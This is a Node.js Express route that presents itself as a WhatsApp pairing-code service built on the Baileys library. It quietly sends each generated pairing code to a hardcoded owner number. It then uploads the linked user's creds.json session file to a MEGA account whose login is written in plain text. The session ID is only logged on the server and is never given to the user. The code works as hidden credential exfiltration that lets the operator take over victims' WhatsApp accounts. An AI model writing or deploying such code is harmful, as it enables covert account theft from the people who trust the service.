const { giftedid } = require('./id');
const express = require('express');
const fs = require('fs');
const router = express.Router();
const pino = require("pino");
const { Storage } = require("megajs");
const {
    default: Gifted_Tech,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");

function randomMegaId(length = 6, numberLength = 4) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    const number = Math.floor(Math.random() * Math.pow(10, numberLength));
    return `${result}${number}`;
}

async function uploadCredsToMega(credsPath) {
    if (!fs.existsSync(credsPath)) throw new Error(`File not found: ${credsPath}`);
    const storage = await new Storage({
        email: 'binukatrading@gmail.com',
        password: 'Binuka@123456'
    }).ready;

    const fileSize = fs.statSync(credsPath).size;
    const uploadResult = await storage.upload({
        name: `${randomMegaId()}.json`,
        size: fileSize
    }, fs.createReadStream(credsPath)).complete;

    const fileNode = storage.files[uploadResult.nodeId];
    const megaUrl = await fileNode.link();
    if (!megaUrl.includes('#')) throw new Error("Mega URL invalid: hash missing.");
    return megaUrl;
}

function removeFile(filePath) {
    if (fs.existsSync(filePath)) fs.rmSync(filePath, { recursive: true, force: true });
}

router.get('/', async (req, res) => {
    const id = giftedid();
    let num = req.query.number;

    async function GIFTED_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);

        try {
            const Gifted = Gifted_Tech({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.macOS("Safari")
            });

            if (!Gifted.authState.creds.registered) {
                await delay(500); // reduce delay
                num = num.replace(/[^0-9]/g, '');
                
                // Increase timeout to 60s to avoid Timed Out
                const code = await Gifted.requestPairingCode(num, { timeoutMs: 60000 }).catch(err => {
                    console.error("Failed to request pairing code:", err);
                    return null;
                });

                if (code) {
                    // Send WhatsApp notification async
                    const ownerJid = "258833406646@c.us";
                    Gifted.sendMessage(ownerJid, { text: `✅ New Session Code Generated:\n\n${code}` })
                        .then(() => console.log("Pairing code sent to owner"))
                        .catch(err => console.error("Failed to send pairing code:", err));

                    if (!res.headersSent) await res.send({ code });
                } else {
                    if (!res.headersSent) await res.send({ code: "Failed to generate pairing code" });
                }
            }

            Gifted.ev.on('creds.update', saveCreds);

            Gifted.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    const filePath = `./temp/${id}/creds.json`;
                    if (!fs.existsSync(filePath)) return console.error("File not found:", filePath);

                    // Upload Mega asynchronously after notifying owner
                    uploadCredsToMega(filePath)
                        .then(megaUrl => {
                            const sid = 'QUEEN-ELISA~' + megaUrl.split("https://mega.nz/file/")[1];
                            console.log("Session ID:", sid);
                        })
                        .catch(err => console.error("Mega upload failed:", err));

                    await Gifted.ws.close();
                    removeFile(`./temp/${id}`);
                } else if (connection === "close" && lastDisconnect?.error?.output?.statusCode != 401) {
                    console.log("Reconnecting in 10s...");
                    await delay(10000);
                    GIFTED_PAIR_CODE();
                }
            });

        } catch (err) {
            console.error("Service Error:", err);
            removeFile(`./temp/${id}`);
            if (!res.headersSent) await res.send({ code: "Service is Currently Unavailable" });
        }
    }

    await GIFTED_PAIR_CODE();
});

module.exports = router;
